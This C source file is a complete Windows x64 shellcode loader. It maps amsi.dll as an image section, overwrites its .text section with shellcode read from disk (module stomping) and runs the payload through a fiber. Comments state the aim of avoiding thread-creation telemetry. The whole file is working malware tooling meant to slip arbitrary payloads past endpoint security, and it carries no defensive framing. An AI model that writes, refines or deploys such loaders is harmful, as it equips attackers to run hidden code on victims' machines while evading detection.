/*
 * calc_loader_iter1.c
 * x64 Windows shellcode loader — module stomping via SEC_IMAGE section mapping
 * + fiber execution.
 *
 * Build (MSVC):
 *   cl.exe /nologo /O2 /W3 calc_loader_iter1.c /link ntdll.lib
 *
 * Run:
 *   calc_loader_iter1.exe C:\path\to\calc.bin
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ------------------------------------------------------------------ */
/* Manually declared NT types / prototypes (winternl.h is incomplete). */
/* ------------------------------------------------------------------ */

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef LONG NTSTATUS;

typedef struct _UNICODE_STRING_LOCAL {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_LOCAL;

typedef struct _OBJECT_ATTRIBUTES_LOCAL {
    ULONG           Length;
    HANDLE          RootDirectory;
    UNICODE_STRING_LOCAL *ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES_LOCAL;

typedef struct _IO_STATUS_BLOCK_LOCAL {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK_LOCAL;

/* NtCreateFile */
typedef NTSTATUS (NTAPI *pNtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    OBJECT_ATTRIBUTES_LOCAL *ObjectAttributes,
    IO_STATUS_BLOCK_LOCAL *IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength);

/* NtCreateSection */
typedef NTSTATUS (NTAPI *pNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    OBJECT_ATTRIBUTES_LOCAL *ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle);

/* NtMapViewOfSection */
typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    ULONG InheritDisposition,   /* SECTION_INHERIT */
    ULONG AllocationType,
    ULONG Win32Protect);

/* NtClose */
typedef NTSTATUS (NTAPI *pNtClose)(HANDLE Handle);

/* Constants we need that are not always in headers */
#ifndef SEC_IMAGE
#define SEC_IMAGE 0x01000000
#endif
#ifndef ViewShare
#define ViewShare 1
#endif
#ifndef FILE_OPEN
#define FILE_OPEN 0x00000001
#endif
#ifndef FILE_NON_DIRECTORY_FILE
#define FILE_NON_DIRECTORY_FILE 0x00000040
#endif
#ifndef OBJ_CASE_INSENSITIVE
#define OBJ_CASE_INSENSITIVE 0x00000040
#endif
#ifndef FILE_SYNCHRONOUS_IO_NONALERT
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#endif

/* ------------------------------------------------------------------ */
/* Helpers                                                            */
/* ------------------------------------------------------------------ */

static void init_unicode_string(UNICODE_STRING_LOCAL *us, const wchar_t *s)
{
    size_t len = wcslen(s);
    us->Length        = (USHORT)(len * sizeof(wchar_t));
    us->MaximumLength = (USHORT)((len + 1) * sizeof(wchar_t));
    us->Buffer        = (PWSTR)s;
}

static void init_object_attributes(OBJECT_ATTRIBUTES_LOCAL *oa,
                                   UNICODE_STRING_LOCAL *name)
{
    oa->Length                   = sizeof(OBJECT_ATTRIBUTES_LOCAL);
    oa->RootDirectory            = NULL;
    oa->ObjectName               = name;
    oa->Attributes               = OBJ_CASE_INSENSITIVE;
    oa->SecurityDescriptor       = NULL;
    oa->SecurityQualityOfService = NULL;
}

/* Read entire file into a freshly allocated buffer. Caller frees. */
static unsigned char *read_file_all(const char *path, size_t *out_size)
{
    FILE *fp = NULL;
    long  sz = 0;
    unsigned char *buf = NULL;

    *out_size = 0;

    if (fopen_s(&fp, path, "rb") != 0 || fp == NULL) {
        return NULL;
    }
    if (fseek(fp, 0, SEEK_END) != 0) {
        fclose(fp);
        return NULL;
    }
    sz = ftell(fp);
    if (sz <= 0) {
        fclose(fp);
        return NULL;
    }
    if (fseek(fp, 0, SEEK_SET) != 0) {
        fclose(fp);
        return NULL;
    }
    buf = (unsigned char *)malloc((size_t)sz);
    if (buf == NULL) {
        fclose(fp);
        return NULL;
    }
    if (fread(buf, 1, (size_t)sz, fp) != (size_t)sz) {
        free(buf);
        fclose(fp);
        return NULL;
    }
    fclose(fp);
    *out_size = (size_t)sz;
    return buf;
}

/*
 * Locate the raw bytes of the .text section inside a mapped PE image.
 * Returns pointer + size on success, NULL on failure.
 */
static unsigned char *find_text_section(unsigned char *base,
                                        size_t *out_size)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt  = NULL;
    IMAGE_SECTION_HEADER *sec = NULL;
    WORD i = 0;

    *out_size = 0;

    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        /* 8-byte section name, compare first 5 bytes to ".text" */
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            *out_size = sec[i].Misc.VirtualSize;
            return base + sec[i].VirtualAddress;
        }
    }
    return NULL;
}

/* Round a size up to the next system page boundary. */
static size_t round_up_to_page(size_t n)
{
    SYSTEM_INFO si;
    size_t page;

    GetSystemInfo(&si);
    page = (size_t)si.dwPageSize;
    if (page == 0) {
        page = 0x1000;
    }
    return (n + page - 1) & ~(page - 1);
}

/* ------------------------------------------------------------------ */
/* Fiber entry — runs the payload, then exits the process.            */
/* ------------------------------------------------------------------ */

typedef struct _FIBER_CTX {
    void *payload;
} FIBER_CTX;

static VOID CALLBACK fiber_entry(LPVOID param)
{
    FIBER_CTX *ctx = (FIBER_CTX *)param;
    void (*fn)(void) = (void (*)(void))ctx->payload;
    fn();
    /* Payload may not return; if it does, clean exit. */
    ExitProcess(0);
}

/* ------------------------------------------------------------------ */
/* main                                                               */
/* ------------------------------------------------------------------ */

int main(int argc, char *argv[])
{
    unsigned char *shellcode = NULL;
    size_t         shellcode_size = 0;

    HMODULE hNtdll = NULL;
    pNtCreateFile        NtCreateFile        = NULL;
    pNtCreateSection     NtCreateSection     = NULL;
    pNtMapViewOfSection  NtMapViewOfSection  = NULL;
    pNtClose             NtClose             = NULL;

    const wchar_t *target_dll = L"\\??\\C:\\Windows\\System32\\amsi.dll";

    UNICODE_STRING_LOCAL  us;
    OBJECT_ATTRIBUTES_LOCAL oa;
    IO_STATUS_BLOCK_LOCAL iosb;
    HANDLE  hFile = NULL;
    HANDLE  hSec  = NULL;
    NTSTATUS st   = 0;

    PVOID   view_base = NULL;
    SIZE_T  view_size = 0;

    unsigned char *text = NULL;
    size_t         text_size = 0;
    size_t         exec_size = 0;

    DWORD   old_prot = 0;
    FIBER_CTX ctx;
    LPVOID  main_fiber = NULL;
    LPVOID  pay_fiber  = NULL;

    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    /* 1. Read the shellcode from disk. */
    shellcode = read_file_all(argv[1], &shellcode_size);
    if (shellcode == NULL || shellcode_size == 0) {
        fprintf(stderr, "[-] failed to read payload: %s\n", argv[1]);
        return 1;
    }
    printf("[+] payload: %s (%zu bytes)\n", argv[1], shellcode_size);

    /* 2. Resolve NT APIs from ntdll. */
    hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) {
        fprintf(stderr, "[-] GetModuleHandleA(ntdll) failed\n");
        free(shellcode);
        return 1;
    }
    NtCreateFile       = (pNtCreateFile)      GetProcAddress(hNtdll, "NtCreateFile");
    NtCreateSection    = (pNtCreateSection)   GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtClose            = (pNtClose)           GetProcAddress(hNtdll, "NtClose");

    if (!NtCreateFile || !NtCreateSection || !NtMapViewOfSection || !NtClose) {
        fprintf(stderr, "[-] failed to resolve NT APIs\n");
        free(shellcode);
        return 1;
    }

    /* 3. Open the sacrificial DLL for read+execute. */
    init_unicode_string(&us, target_dll);
    init_object_attributes(&oa, &us);
    memset(&iosb, 0, sizeof(iosb));

    st = NtCreateFile(
            &hFile,
            FILE_READ_DATA | FILE_EXECUTE | SYNCHRONIZE,
            &oa,
            &iosb,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtCreateFile failed: 0x%08lX\n", (unsigned long)st);
        free(shellcode);
        return 1;
    }

    /* 4. Create a file-backed image section (SEC_IMAGE, READONLY). */
    st = NtCreateSection(
            &hSec,
            SECTION_MAP_READ | SECTION_MAP_EXECUTE,
            NULL,
            NULL,
            PAGE_READONLY,
            SEC_IMAGE,
            hFile);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "[-] NtCreateSection failed: 0x%08lX\n", (unsigned long)st);
        NtClose(hFile);
        free(shellcode);
        return 1;
    }

    /* 5. Map the image into our own process (READONLY view). */
    view_size = 0;
    st = NtMapViewOfSection(
            hSec,
            GetCurrentProcess(),
            &view_base,
            0,
            0,
            NULL,
            &view_size,
            ViewShare,
            0,
            PAGE_READONLY);
    if (!NT_SUCCESS(st) || view_base == NULL) {
        fprintf(stderr, "[-] NtMapViewOfSection failed: 0x%08lX\n", (unsigned long)st);
        NtClose(hSec);
        NtClose(hFile);
        free(shellcode);
        return 1;
    }

    /* 6. Locate .text inside the mapped image. */
    text = find_text_section((unsigned char *)view_base, &text_size);
    if (text == NULL || text_size < shellcode_size) {
        fprintf(stderr, "[-] .text not found or too small (text=%zu, sc=%zu)\n",
                text_size, shellcode_size);
        NtClose(hSec);
        NtClose(hFile);
        free(shellcode);
        return 1;
    }

    /*
     * 7. Flip .text page(s) to RW, copy payload, flip to RX.
     *    Protect the full page span so multi-page shellcode does not
     *    fault on a still-READONLY page.
     */
    exec_size = round_up_to_page(shellcode_size);
    if (exec_size > text_size) {
        exec_size = round_up_to_page(text_size);
    }

    if (!VirtualProtect(text, exec_size, PAGE_READWRITE, &old_prot)) {
        fprintf(stderr, "[-] VirtualProtect(RW) failed: %lu\n", GetLastError());
        NtClose(hSec);
        NtClose(hFile);
        free(shellcode);
        return 1;
    }
    memcpy(text, shellcode, shellcode_size);
    if (!VirtualProtect(text, exec_size, PAGE_EXECUTE_READ, &old_prot)) {
        fprintf(stderr, "[-] VirtualProtect(RX) failed: %lu\n", GetLastError());
        NtClose(hSec);
        NtClose(hFile);
        free(shellcode);
        return 1;
    }

    /* Free the on-disk buffer; the payload now lives in the image. */
    free(shellcode);
    shellcode = NULL;

    /* 8. Execute via fiber — no CreateThread telemetry. */
    ctx.payload = (void *)text;

    main_fiber = ConvertThreadToFiber(NULL);
    if (main_fiber == NULL) {
        fprintf(stderr, "[-] ConvertThreadToFiber failed: %lu\n", GetLastError());
        NtClose(hSec);
        NtClose(hFile);
        return 1;
    }
    pay_fiber = CreateFiber(0, fiber_entry, &ctx);
    if (pay_fiber == NULL) {
        fprintf(stderr, "[-] CreateFiber failed: %lu\n", GetLastError());
        NtClose(hSec);
        NtClose(hFile);
        return 1;
    }

    printf("[+] switching to payload fiber @ %p\n", (void *)text);
    SwitchToFiber(pay_fiber);

    /* Should not be reached: fiber_entry calls ExitProcess. */
    NtClose(hSec);
    NtClose(hFile);
    return 0;
}